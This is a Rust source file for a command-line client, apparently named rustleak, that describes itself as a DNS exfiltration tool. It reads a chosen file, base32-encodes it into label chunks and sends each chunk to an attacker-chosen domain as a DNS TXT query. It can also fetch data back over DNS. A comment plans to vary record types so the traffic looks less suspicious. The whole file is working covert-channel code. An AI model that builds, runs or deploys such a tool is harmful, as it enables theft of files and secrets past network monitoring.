use clap::{Parser, Subcommand};
use std::fs;
use log::{error, info};
use simple_logger::SimpleLogger;
use rustleak_lib::{dns::*, utils::{decode_base32, encode_base32, split_data_into_label_chunks}};

#[derive(Parser, Debug)]
#[command(version, about, long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand, Debug)]
enum Commands {
    /// Send data
    Send {
        /// Code to send
        #[arg(short, long)]
        code: String,

        /// Filename to read data from
        #[arg(short, long)]
        filename: String,

        /// Domain name of the DNS Server
        #[arg(short, long)]
        domain: String,
    },
    /// Receive data
    Receive {
        /// Code to receive
        #[arg(short, long)]
        code: String,
        
        /// Filename to save data to
        #[arg(short, long)]
        filename: String,

        /// Domain name of the DNS Server
        #[arg(short, long)]
        domain: String,
    },
}

#[tokio::main]
async fn main() {
    SimpleLogger::new().init().unwrap();
    let args = Args::parse();

    // Retrieve args
    let (code, filename, domain) = match &args.command {
        Commands::Send { code, filename, domain } => (code.clone(), filename.clone(), domain.clone()),
        Commands::Receive { code, filename, domain } => (code.clone(), filename.clone(), domain.clone()),
    };




    let resolver = get_resolver();

    info!("Starting DNS Exfiltration client");
    info!("Trying to resolve domain: {}", &domain);

    // Check if the domain exist and is reachable
    match resolver.lookup(&domain, hickory_resolver::proto::rr::RecordType::ANY).await {
        Ok(_) => info!("Domain {} exists and is reachable", &domain),
        Err(e) => {
            error!("Error resolving domain: {}", e);
            eprintln!("Error resolving domain: {}", e);
            std::process::exit(1);
        }
    };



    // TODO : server routes
    // - Upload: OK
    // - Download: OK
    // - Close : /

    match args.command {
        Commands::Send { code, filename, domain } => {

            // Check if file exists and is readable
            match fs::read_to_string(&filename) {
                Ok(_) => info!("File {} exists and is readable", &filename),
                Err(e) => {
                    error!("Error reading file: {}", e);
                    eprintln!("Error reading file: {}", e);

                }
            };

            // Implement the logic for sending data
            info!("Sending data with code: {}, filename: {}, domain: {}", code, filename, domain);
            
            let raw_bytes: Vec<u8> = fs::read(&filename).unwrap();
            let labels = split_data_into_label_chunks(&raw_bytes);
            let encoded_labels = encode_base32(labels);
            info! ("Encoded labels: {:?}", encoded_labels);
            // UPLOAD DNS QUERY FORMAT
            // UPLOAD.DATA.NBSEQ.MAXSEQ.CODE.DOMAIN
            
            for (i, label) in encoded_labels.iter().enumerate() {
                let query = format!("UPLOAD.{}.{}.{}.{}.{}", label, i, encoded_labels.len(), code, domain);
                // TODO : Choose randomly between TXT and A, CNAME to be less suspicious
                let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await.expect("An error occured while sending data.");
                info!("Sent query: {}, response: {:?}", query, response);
            }

            info!("Data sent successfully !");
            

        }
        Commands::Receive { code, filename, domain } => {

            // Check if output is writable
            match fs::OpenOptions::new().write(true).create(true).open(&filename) {
                Ok(_) => info!("File {} is writable", &filename),
                Err(e) => {
                    error!("Error opening file for writing: {}", e);
                    eprintln!("Error opening file for writing: {}", e);
                }
            };

            // Implement the logic for receiving data
            info!("Receiving data with code: {}, filename: {}, domain: {}", code, filename, domain);

            
            
            // DOWNLOAD DNS QUERY FORMAT
            // DOWNLOAD.CODE.DOMAIN 
            // - EOF = End of file
            // - DATA = Data to write to file

            let mut received_data: Vec<String> = Vec::new();

            loop {
                let query = format!("DOWNLOAD.{}.{}", code , domain);
                let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await;

                match response {
                    Ok(lookup) => {
                        let records = lookup.iter().collect::<Vec<_>>();
                        
                        if records.is_empty() {
                            error!("No records found for query: {}", query);
                            break;
                        }
                        

                        let record_data = records[0].to_string();

                        if record_data.contains("ERROR") {
                            error!("Received error from server: {}", record_data);
                            break;
                        }
                        
                        if record_data == "EOF" {
                            info!("EOF reached, file download complete.");

                            // Close the transfer

                            let query = format!("CLOSE.{}.{}", code, domain);
                            let response = resolver.lookup(&query, hickory_resolver::proto::rr::RecordType::TXT).await.expect("An error occured while closing the transfer.");
                            info!("Cleaning up the DNS Server");


                            break;

                        } else {
                            received_data.push(record_data);
                        }
                    }
                    Err(e) => {
                        error!("Error during DNS lookup: {}", e);
                        break;
                    }
                }
            }

            let decoded_data = decode_base32(received_data);
            let flattened_data: Vec<u8> = decoded_data.into_iter().flatten().collect();
            fs::write(&filename, flattened_data).expect("Failed to write data to file");
            info!("Data received and written to file: {}", filename);
            }

        
    }




}
